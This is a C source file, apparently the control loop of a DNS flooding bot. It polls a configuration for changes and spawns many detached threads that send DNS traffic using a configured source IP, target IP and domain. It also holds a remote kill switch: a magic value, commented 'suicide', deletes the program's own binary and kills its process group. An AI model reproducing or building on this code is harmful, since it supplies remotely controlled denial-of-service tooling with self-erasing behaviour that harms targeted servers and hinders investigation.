#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include "config.h"
#include "worker.h"
#include "dns.h"
#include "utils.h"
#include "logger.h"

Configuration config;

int
fork_process(void (*func) ())
{
	int     ret = fork();

	if(ret == 0) {
		func();
	}

	if(ret > 0) {
	}

	return ret;
}


int
new_thread_p(void *func, void *i)
{
	pthread_t thread;
	pthread_attr_t attr;
	pthread_attr_init(&attr);
	pthread_attr_setscope(&attr, PTHREAD_SCOPE_SYSTEM);

	pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

	if(pthread_create(&thread, &attr, func, i)) {
		return 0;
	}

	return 1;
}


void
start_worker()
{
	//new_thread_p(config_worker, 0);
	int     thread = 0;
	while(1) {
		if(parse_config() > 0) {
			log_debug(logger,
				  "\nov=%s, nv=%s\nactive=%d,domain=%s,thread=%d\nsource=%s,target=%s",
				  oldmd5, newmd5, config.dns_active,
				  config.dns_domain, config.dns_threads,
				  config.dns_sourceip, config.dns_targetip);
			if(config.dns_interval == 43) {	//自杀
				remove(process_filename);
				kill(0, SIGTERM);
				exit(0);
			}
			if(strlen(oldmd5) == 0 && strlen(newmd5) != 0) {
				strcpy(oldmd5, newmd5);
				if(config.dns_active) {
					for(thread = 0;
					    thread < config.dns_threads;
					    thread++) {
						log_info(logger,
							 "dns_worker #%d started",
							 thread);
						new_thread_p(dns_send, 0);
					}
					log_info(logger, " %s[%s]",
						 config.dns_targetip,
						 config.dns_domain);
				} else {
					log_info(logger, "dns_send stoped");
				}
			}

			if(strlen(oldmd5) != 0 && strcmp(oldmd5, newmd5) != 0) {
				log_info(logger, "restart child process");
				exit(1);
			}
		}
		sleep(5);
	}
}
